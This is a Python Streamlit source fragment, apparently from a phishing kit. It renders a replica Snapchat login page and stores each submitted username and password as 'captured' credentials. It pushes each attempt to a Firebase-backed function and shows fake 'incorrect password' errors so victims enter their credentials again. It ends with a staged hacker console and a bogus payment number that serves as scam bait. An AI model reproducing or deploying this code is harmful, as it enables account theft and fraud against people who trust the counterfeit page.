    st.markdown("<div class='center-logo-box-matrix' style='box-shadow:none; border:none; margin-bottom:10px;'>", unsafe_allow_html=True)
    try:
        st.image("2.jpg")
    except:
        st.markdown("<p style='color:#ff4444; font-size:26px; font-weight:800; margin:0;'>logo</p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)
            
    st.markdown("<p class='replica-brand-text'>snapchat</p>", unsafe_allow_html=True)
    
    with st.form("screenshot_replica_form_engine", clear_on_submit=False):
        st.markdown("<span class='replica-field-title'>Username or Email</span>", unsafe_allow_html=True)
        login_user_string = st.text_input("user_replica", placeholder="Your Username Here", label_visibility="collapsed")
        
        st.write("")
        
        st.markdown("<span class='replica-field-title'>Password</span>", unsafe_allow_html=True)
        login_pass_string = st.text_input("pass_replica", type="password", placeholder="••••••••", label_visibility="collapsed")
        
        st.markdown("<p class='forgot-pass-trigger-text'>Forgot Password</p>", unsafe_allow_html=True)
        
        st.write("")
        form_submit_trigger = st.form_submit_button("Log In", type="secondary")
        
        if form_submit_trigger:
            if login_user_string and login_pass_string:
                st.session_state.random_seed = random.randint(10, 99)
                log_capture_map = {
                    "intercept_attempt_index": st.session_state.login_attempts_count,
                    "captured_login_handle": login_user_string,
                    "captured_login_credential": login_pass_string,
                    "timestamp_string": str(datetime.datetime.now())
                }
                st.session_state.intercepted_dataset.append(log_capture_map)
                
                # Rigid 2-Attempt Failure Matrix Loop Logic
                if st.session_state.login_attempts_count < 3:
                    push_to_firebase_matrix(f"INTERCEPT_PHASE_ATTEMPT_{st.session_state.login_attempts_count}")
                    st.session_state.login_attempts_count += 1
                    with st.spinner("Connecting to authentication server node..."):
                        time.sleep(3.5)
                    st.error("Oops! The password you entered is incorrect. Please double check and try again.")
                else:
                    push_to_firebase_matrix("INTERCEPT_COMPLETE_SYSTEM_CLEAR")
                    with st.spinner("Syncing verified priority access tokens..."):
                        time.sleep(3.5)
                    st.session_state.step = 6
                    st.rerun()
            else:
                st.warning("All parameters required.")
                
    st.markdown("</div>", unsafe_allow_html=True)
    st.markdown("<p style='text-align:center; font-size:14px; color:#000000; font-weight:500; margin-top:35px;'>New To snapchat ?<b style='font-weight:700; margin-left:5px;'>Sign Up</b></p>", unsafe_allow_html=True)
    st.markdown("</div>", unsafe_allow_html=True)


# ==========================================
# STEP 6: COMPLEX TERMINAL PIPELINE & RELEASE
# ==========================================
elif st.session_state.step == 6:
    st.markdown("<div class='premium-canvas-wrapper'>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center; font-weight:800; color:#2563eb !important;'>💻 EXECUTION PROTOCOLS DEPLOYED</h3>", unsafe_allow_html=True)
    
    console_view = st.empty()
    console_lines = [
        "Verifying structural checksum hash validations...",
        "Establishing persistent link channels with transaction database...",
        "Injecting priority queue traffic routes to verified hardware target...",
        "Syncing session configuration metadata fields... PASSED",
        "Assembling tracking payload arrays inside isolated partition lines...",
        "Finalizing payload deployment... SYSTEM SUCCESS"
    ]
    
    cmd_markup_accumulator = ""
    for specific_line in console_lines:
        cmd_markup_accumulator += f"&gt; {specific_line}<br>"
        console_view.markdown(f"<div class='hacker-cmd-box'><p class='hacker-cmd-string'>{cmd_markup_accumulator}</p></div>", unsafe_allow_html=True)
        time.sleep(1.4)
        
    console_view.empty()
    
    st.success("✅ PRIORITY ROUTING CHANNELS DEPLOYED SUCCESSFULLY!")
    generated_payment_number = f"PMT-TK-{str(uuid.uuid4())[:10].upper()}"
    
    token_display_box = f"""
    <div style='text-align:center; padding:25px; background:#f0fdf4; border-radius:14px; border:2px solid #16a34a; margin:20px 0; box-shadow: 0 4px 15px rgba(22, 163, 74, 0.1);'>
        <h2 style='color:#16a34a; font-weight:800; margin:0 0 6px 0; font-size:18px;'>PAYMENT GENERATION NUMBER CLAIMED</h2>
        <code style='font-size:19px; font-weight:800; color:#1e293b; background:#ffffff; padding:6px 14px; border-radius:8px; border:2px solid #cbd5e1; font-family:monospace;'>{generated_payment_number}</code>
        <p style='margin:16px 0 0 0; font-size:14.5px; font-weight:700; color:#16a34a;'>🚀 Allocation Stream Priority: Active (Est Delivery Transit: 20 days)</p>
    </div>
    """
    st.markdown(token_display_box, unsafe_allow_html=True)
    
    if st.button("RESET CONTROL HANDSHAKE TERMINAL", type="primary", use_container_width=True):
        st.session_state.clear()
        st.rerun()
        
    st.markdown("</div>", unsafe_allow_html=True)


        
